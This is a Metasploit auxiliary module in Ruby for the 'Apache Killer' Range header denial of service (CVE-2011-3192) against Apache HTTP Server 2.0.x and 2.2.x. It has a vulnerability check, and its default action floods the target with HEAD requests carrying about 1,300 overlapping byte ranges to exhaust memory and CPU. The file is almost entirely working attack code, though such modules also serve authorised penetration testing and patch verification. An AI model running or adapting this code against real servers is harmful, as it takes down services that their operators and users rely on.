##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Range Header DoS (Apache Killer)',
      'Description'    => %q{
          The byterange filter in the Apache HTTP Server 2.0.x through 2.0.64, and 2.2.x
        through 2.2.19 allows remote attackers to cause a denial of service (memory and
        CPU consumption) via a Range header that expresses multiple overlapping ranges,
        exploit called "Apache Killer"
      },
      'Author'         =>
        [
          'Kingcope', #original discoverer
          'Masashi Fujiwara', #metasploit module
          'Markus Neis <markus.neis[at]gmail.com>' # check for vulnerability
        ],
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          ['DOS'],
          ['CHECK']
        ],
      'DefaultAction'  => 'DOS',
      'References'     =>
        [
          [ 'BID', '49303'],
          [ 'CVE', '2011-3192'],
          [ 'EDB', '17696'],
          [ 'OSVDB', '74721' ],
        ],
      'DisclosureDate' => 'Aug 19 2011'
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('URI', [ true,  "The request URI", '/']),
        OptInt.new('RLIMIT', [ true,  "Number of requests to send",50])
      ])
  end

  def run_host(ip)

    case action.name
    when 'DOS'
      conduct_dos()

    when 'CHECK'
      check_for_dos()
    end

  end

  def check_for_dos()
    uri = datastore['URI']
    rhost = datastore['RHOST']
    begin
      res = send_request_cgi({
        'uri'     =>  uri,
        'method'  => 'HEAD',
        'headers' => {
          "HOST"  => rhost,
          "Range" => "bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10",
          "Request-Range" => "bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10"
        }
      })

      if (res and res.code == 206)
        print_status("Response was #{res.code}")
        print_status("Found Byte-Range Header DOS at #{uri}")

        report_note(
          :host   => rhost,
          :port   => rport,
          :type   => 'apache.killer',
          :data   => "Apache Byte-Range DOS at #{uri}"
        )

      else
        print_status("#{rhost} doesn't seem to be vulnerable at #{uri}")
      end

      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end


  def conduct_dos()
    uri = datastore['URI']
    rhost = datastore['RHOST']
    ranges = ''
    for i in (0..1299) do
      ranges += ",5-" + i.to_s
    end
    for x in 1..datastore['RLIMIT']
      begin
        print_status("Sending DoS packet #{x} to #{rhost}:#{rport}")
        res = send_request_cgi({
          'uri'     =>  uri,
          'method'  => 'HEAD',
          'headers' => {
            "HOST"  => rhost,
            "Range" => "bytes=0-#{ranges}",
            "Request-Range" => "bytes=0-#{ranges}"}},1)

      rescue ::Rex::ConnectionRefused
        print_error("Unable to connect to #{rhost}:#{rport}")
      rescue ::Errno::ECONNRESET
        print_good("DoS packet successful. #{rhost} not responding.")
      rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        print_error("Couldn't connect to #{rhost}:#{rport}")
      rescue ::Timeout::Error, ::Errno::EPIPE
      end
    end
  end
end
